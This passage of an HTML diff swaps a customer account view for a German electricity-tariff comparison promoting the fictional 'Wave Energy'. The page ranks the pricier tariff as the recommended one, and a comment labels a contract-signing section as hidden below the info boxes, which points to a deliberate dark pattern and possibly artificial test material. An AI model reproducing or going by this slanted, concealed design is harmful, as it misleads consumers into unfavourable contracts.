S30lHRlqNgy2bWx7lKW+kPZH1BQvtmxsu79BxoJtf0TtsJA8pvel8N9m+0rg+veKJfwRg9aL7ZJkZDAwLbza2NrrgCgmMYpe8QZ/zcvvPkTu06iBvEYGE+Pk8zG9h0nIhpfrLIz+CZtjeh+TkA3PBufqvxMj2djYxi0Yzw3lKTLw34so4e+4/550HzRPkcHMxPHXxuZ7RUhd1pHB8Cez1jY2v0uGLFhHhsDfq1OcjIfH7TZRlXITB/+ioeJuvt87Zj36Yiv2zfZ7x/zh2taKfulzsZ8hS+NZhZXt4zD/A8oKmO6lYjvHAAAAAElFTkSuQmCC" alt="Wave Energy" />
+<span class="topbar-name">Wave Energy</span>
+</div>
+</nav>
 
-<div class="card user-info">
-<h2 id="userName">—</h2>
-<p id="customerNumber">Kundennummer #—</p>
+<!-- ===== SECTION 1: COMPARISON ===== -->
+<div id="comparison-section">
+<main class="section">
+
+<!-- Hero -->
+<header class="hero">
+<div class="hero-badge">Stromvergleich 2026</div>
+<h1>Finde deinen besten Stromtarif</h1>
+<p>Direktvergleich für deinen Haushalt</p>
+</header>
+
+<!-- Params -->
+<div class="params-bar">
+<div class="param-chip">⚡ <strong>2.500 kWh</strong></div>
+<div class="param-chip">📅 <strong>monatl.</strong></div>
+<div class="param-chip">📍 <strong>60313</strong></div>
 </div>
 
-<div class="card">
-<strong>Letzte 7 Tage Transaktionen</strong>
-<ul class="transaction-list" id="transactionList"></ul>
-<div class="meta">
-<span>Zuletzt aktualisiert: <span id="lastUpdated">—</span></span>
-<button class="btn" id="refreshBtn">Aktualisieren</button>
+<!-- Savings banner -->
+<div class="savings-banner">
+<div class="s-label">Deine Ersparnis mit Wave Energy</div>
+<div class="s-amount">+150 € Sofortbonus</div>
+<div class="s-sub">Exklusiv für Neukunden</div>
+</div>
+
+<!-- ===== PROVIDER SELECTOR TABS ===== -->
+<div class="provider-selector">
+<div class="provider-tab recommended active" data-slide="0" onclick="switchSlide(0)">
+<div class="provider-tab-logo wave">
+<img src="data:image/png;base64,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" alt="Wave Energy" />
+</div>
+<div class="provider-tab-info">
+<div class="provider-tab-name">Wave Energy</div>
+<div class="provider-tab-sub">Ökostrom</div>
+</div>
+<div class="provider-tab-price">
+<div class="provider-tab-price-main">904€</div>
+<div class="provider-tab-price-sub">/Jahr</div>
 </div>
 </div>
 
+<div class="provider-tab" data-slide="1" onclick="switchSlide(1)">
+<div class="provider-tab-logo volt">
+<svg viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="VoltPower Logo">
+<rect width="38" height="38" rx="10" fill="#E8F4FF"/>
+<polygon points="21,5 12,21 18,21 17,33 26,17 20,17" fill="#1565c0" opacity="0.9"/>
+<polygon points="21,5 12,21 18,21 17,33 26,17 20,17" fill="none" stroke="#2196f3" stroke-width="0.7"/>
+</svg>
+</div>
+<div class="provider-tab-info">
+<div class="provider-tab-name">VoltPower</div>
+<div class="provider-tab-sub">Basic</div>
+</div>
+<div class="provider-tab-price">
+<div class="provider-tab-price-main">880€</div>
+<div class="provider-tab-price-sub">/Jahr</div>
+</div>
+</div>
+</div>
+<!-- ===== END PROVIDER SELECTOR ===== -->
+
+<!-- ===== CAROUSEL WRAPPER ===== -->
+<div class="carousel-wrapper">
+<button class="carousel-nav prev" id="carouselPrev" aria-label="Vorheriger Tarif">‹</button>
+<button class="carousel-nav next" id="carouselNext" aria-label="Nächster Tarif">›</button>
+
+<div class="carousel-container" id="carouselContainer">
+<div class="carousel-track">
+
+<!-- WAVE ENERGY CARD -->
+<div class="carousel-slide">
+<article class="card featured">
+<div class="card-head">
+<div class="card-head-top">
+<div class="logo-box logo-wave">
+<img src="data:image/png;base64,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" alt="Wave Energy" />
+</div>
+<span class="badge-top badge-recommend">★ Empfehlung</span>
+</div>
+<div class="card-name">Wave Energy</div>
+<div class="card-sub">Flexibler Ökostromtarif · 100% Grünstrom</div>
+</div>
+
+<div class="price-block">
+<div class="price-label">Gesamtkosten / Jahr</div>
+<div class="price-main price-higher">904,15 € <span>/ Jahr</span></div>
+<div class="price-sub">≈ 75,35 € / Monat · inkl. MwSt.</div>
+</div>
+
+<div class="rows">
+<div class="row">
+<div class="row-icon row-icon-gray">🕐</div>
+<div class="row-label">Grundpreis</div>
+<div class="row-value">12,45 €/Monat<br><small style="color:#aaa;font-weight:400;">149,40 €/Jahr</small></div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-gray">⚡</div>
+<div class="row-label">Arbeitspreis</div>
+<div class="row-value">30,19 ct/kWh</div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-green">🛡️</div>
+<div class="row-label">Preisgarantie</div>
+<div class="row-value better">24 Monate <span class="badge-better">✓</span></div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-green">📋</div>
+<div class="row-label">Mindestlaufzeit</div>
+<div class="row-value better">2 Wochen <span class="badge-better">✓</span></div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-green">🔓</div>
+<div class="row-label">Kündigungsfrist</div>
+<div class="row-value better">Jederzeit <span class="badge-better">✓</span></div>
+</div>
+</div>
+
+<div class="section-divider">💰 Boni &amp; Vorteile</div>
+<div class="rows">
+<div class="row">
+<div class="row-icon row-icon-bonus">🎁</div>
+<div class="row-label">Sofortbonus</div>
+<div class="row-value bonus-great">150 € <span class="badge-better">+40 €</span></div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-gray" style="background:#f0f0f5;">—</div>
+<div class="row-label">Neukundenbonus</div>
+<div class="row-value worse">nicht verfügbar</div>
+</div>
+</div>
+
+<div class="info-block">
+<div class="info-title">✦ Warum Wave Energy die bessere Wahl ist</div>
+<ul class="info-list">
+<li>100% zertifizierter Ökostrom aus erneuerbaren Quellen</li>
+<li>Doppelt so lange Preisgarantie (24 vs. 12 Monate)</li>
+<li>Flexibel kündbar – ohne Fristen, ohne Stress</li>
+<li>40 € mehr Sofortbonus gegenüber VoltPower</li>
+<li>Digitaler Vertragsabschluss – in unter 2 Minuten</li>
+</ul>
+</div>
+</article>
+</div>
+
+<!-- VOLTPOWER CARD -->
+<div class="carousel-slide">
+<article class="card">
+<div class="card-head">
+<div class="card-head-top">
+<div class="logo-box logo-volt">
+<svg viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="VoltPower Logo">
+<rect width="38" height="38" rx="10" fill="#E8F4FF"/>
+<polygon points="21,5 12,21 18,21 17,33 26,17 20,17" fill="#1565c0" opacity="0.9"/>
+<polygon points="21,5 12,21 18,21 17,33 26,17 20,17" fill="none" stroke="#2196f3" stroke-width="0.7"/>
+</svg>
+</div>
+<span class="badge-top badge-standard">Standard</span>
+</div>
+<div class="card-name">VoltPower</div>
+<div class="card-sub">VoltPower Strom Basic</div>
+</div>
+
+<div class="price-block">
+<div class="price-label">Gesamtkosten / Jahr</div>
+<div class="price-main">880,30 € <span>/ Jahr</span></div>
+<div class="price-sub">≈ 73,36 € / Monat · inkl. MwSt.</div>
+</div>
+
+<div class="rows">
+<div class="row">
+<div class="row-icon row-icon-gray">🕐</div>
+<div class="row-label">Grundpreis</div>
+<div class="row-value">11,90 €/Monat<br><small style="color:#aaa;font-weight:400;">142,80 €/Jahr</small></div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-gray">⚡</div>
+<div class="row-label">Arbeitspreis</div>
+<div class="row-value">29,50 ct/kWh</div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-gray">🛡️</div>
+<div class="row-label">Preisgarantie</div>
+<div class="row-value worse">12 Monate</div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-gray">📋</div>
+<div class="row-label">Mindestlaufzeit</div>
+<div class="row-value worse">1 Monat</div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-gray">🔓</div>
+<div class="row-label">Kündigungsfrist</div>
+<div class="row-value worse">2 Wochen</div>
+</div>
+</div>
+
+<div class="section-divider">💰 Boni</div>
+<div class="rows">
+<div class="row">
+<div class="row-icon row-icon-bonus">🎁</div>
+<div class="row-label">Sofortbonus</div>
+<div class="row-value bonus-good">110 €</div>
+</div>
+<div class="row">
+<div class="row-icon row-icon-bonus">🎉</div>
+<div class="row-label">Neukundenbonus</div>
+<div class="row-value bonus-good">126 €</div>
+</div>
+</div>
+
+<div class="info-block volt-info">
+<div class="info-title volt">ℹ️ Hinweise zu VoltPower</div>
+<ul class="info-list volt">
+<li>Neukundenbonus erst nach 12 Monaten ausgezahlt</li>
+<li>Nur 12 Monate Preisschutz – danach steigt der Preis oft</li>
+<li>2-Wochen-Kündigungsfrist – weniger flexibel</li>
+<li>Kein zertifizierter Ökostrom im Basic-Tarif</li>
+</ul>
+</div>
+</article>
+</div>
+
+</div>
+</div>
+
+<!-- Carousel Dots -->
+<div class="carousel-dots" id="carouselDots">
+<button class="carousel-dot active" data-index="0" aria-label="Wave Energy" onclick="switchSlide(0)"></button>
+<button class="carousel-dot" data-index="1" aria-label="VoltPower" onclick="switchSlide(1)"></button>
+</div>
+</div>
+<!-- ===== END CAROUSEL ===== -->
+
+<!-- Why section -->
+<div class="why-section">
+<div class="why-title">🌿 Darum lohnt sich Grünstrom</div>
+<div class="why-grid">
+<div class="why-item">
+<div class="why-icon">🌍</div>
+<div class="why-item-title">CO₂-Einsparung</div>
+<div class="why-item-sub">~1,2 Tonnen/Jahr</div>
+</div>
+<div class="why-item">
+<div class="why-icon">🔒</div>
+<div class="why-item-title">Planungssicherheit</div>
+<div class="why-item-sub">24 Monate Preisgarantie</div>
+</div>
+<div class="why-item">
+<div class="why-icon">⭐</div>
+<div class="why-item-title">Kundenbewertung</div>
+<div class="why-item-sub">4,8 / 5 Sterne</div>
+</div>
+<div class="why-item">
+<div class="why-icon">🚀</div>
+<div class="why-item-title">Sofort aktiv</div>
+<div class="why-item-sub">Wechsel in 3–4 Wochen</div>
+</div>
+</div>
+</div>
+
+<!-- API loader status -->
+<div id="api-status" class="api-loader">
+<div class="spinner"></div>
+<span>Verbindung wird hergestellt…</span>
+</div>
+
+<p class="disclaimer">
+Alle Preise inkl. MwSt. · Basis: 2.500 kWh/Jahr · Stand: 2026<br>
+Wave Energy ist ein fiktives Unternehmen zu Demonstrationszwecken.
+</p>
+
+</main>
+</div><!-- /#comparison-section -->
+
+<!-- ===== SECTION 2: SIGNING (HIDDEN BELOW INFO BOXES) ===== -->
+<div id="signing-section">
+<div class="sign-hero">
+<div class="sign-hero-logo">
+<img src="data:image/png;base64,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